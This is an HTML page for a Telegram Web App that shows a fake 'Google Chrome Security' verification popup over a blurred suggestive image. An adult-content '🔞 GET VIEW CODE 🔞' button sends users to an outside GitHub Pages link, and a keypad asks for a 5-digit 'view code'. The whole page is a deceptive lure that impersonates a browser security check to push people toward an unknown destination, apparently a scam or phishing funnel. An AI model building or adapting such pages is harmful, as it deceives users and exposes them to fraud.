<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification UI</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: linear-gradient(rgba(0,0,0,0.2), rgba(0,0,0,0.2)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg'); 
            background-size: cover; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; 
        }
        
        /* Chrome/iOS Style Popup */
        .system-notification {
            position: absolute; top: 20px; width: 90%; max-width: 350px;
            background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(10px);
            border-radius: 15px; padding: 12px; display: flex; align-items: center;
            color: #333; box-shadow: 0 4px 15px rgba(0,0,0,0.3); animation: slideDown 0.5s ease;
        }
        @keyframes slideDown { from { transform: translateY(-100px); } to { transform: translateY(0); } }
        
        .system-notification img { width: 30px; margin-right: 12px; }
        .system-notification .text { font-size: 13px; }

        .card { 
            background: rgba(255, 255, 255, 0.1); /* অনেক বেশি স্বচ্ছ করা হয়েছে */
            backdrop-filter: blur(15px); border-radius: 30px; padding: 25px 20px; 
            width: 320px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.2); 
            margin-top: 50px;
        }

        .instruction { background: #007aff; color: white; padding: 10px; border-radius: 10px; margin-bottom: 20px; font-size: 14px; }

        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .otp-inputs input { 
            width: 45px; height: 55px; background: rgba(255, 255, 255, 0.2); 
            border: 1px solid rgba(255, 255, 255, 0.4); border-radius: 10px; 
            text-align: center; font-size: 24px; color: white; outline: none; 
        }

        .get-code-btn { 
            background: #ff3b30; border: none; width: 100%; padding: 15px; 
            border-radius: 12px; color: white; font-weight: bold; font-size: 16px; 
            cursor: pointer; margin-bottom: 20px;
        }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .key { 
            background: rgba(255, 255, 255, 0.2); padding: 15px; border-radius: 10px; 
            font-size: 20px; font-weight: 500; cursor: pointer; transition: 0.2s;
        }
        .key:active { background: rgba(255, 255, 255, 0.4); }

        .footer-btns { display: flex; gap: 10px; margin-top: 15px; }
        .footer-btn { 
            flex: 1; padding: 10px; border-radius: 8px; border: none; 
            font-size: 13px; cursor: pointer; font-weight: bold;
        }
        .btn-main { background: #34c759; color: white; }
    </style>
</head>
<body>

    <!-- Chrome Style Pop up -->
    <div class="system-notification">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" alt="Chrome">
        <div class="text">
            <b>Google Chrome Security</b><br>
            Verification required to continue viewing.
        </div>
    </div>

    <div class="card">
        <div class="instruction">Enter the 5-digit view code!</div>
        <div class="otp-inputs" id="otp-container">
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
        </div>
        
        <button class="get-code-btn" onclick="openServiceChat()">🔞 GET VIEW CODE 🔞</button>
        
        <div class="keypad">
            <div class="key" onclick="pressKey('1')">1</div>
            <div class="key" onclick="pressKey('2')">2</div>
            <div class="key" onclick="pressKey('3')">3</div>
            <div class="key" onclick="pressKey('4')">4</div>
            <div class="key" onclick="pressKey('5')">5</div>
            <div class="key" onclick="pressKey('6')">6</div>
            <div class="key" onclick="pressKey('7')">7</div>
            <div class="key" onclick="pressKey('8')">8</div>
            <div class="key" onclick="pressKey('9')">9</div>
            <div class="key"></div>
            <div class="key" onclick="pressKey('0')">0</div>
            <div class="key" onclick="pressKey('back')">✖️</div>
        </div>

        <div class="footer-btns">
            <button class="footer-btn btn-main" onclick="tg.close()">🏠 Back to Main Bot</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let inputs = document.querySelectorAll('#otp-container input');
        let currentIdx = 0;

        function pressKey(key) {
            if (key === 'back') {
                if (currentIdx >= 0) {
                    if (inputs[currentIdx].value === "" && currentIdx > 0) currentIdx--;
                    inputs[currentIdx].value = "";
                }
            } else if (currentIdx < inputs.length) {
                inputs[currentIdx].value = key;
                if (currentIdx < inputs.length - 1) currentIdx++;
            }
        }

        function openServiceChat() {
            // go.html এ রিডাইরেক্ট করবে
            const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
            tg.openLink(redirectUrl);
        }
    </script>
</body>
</html>
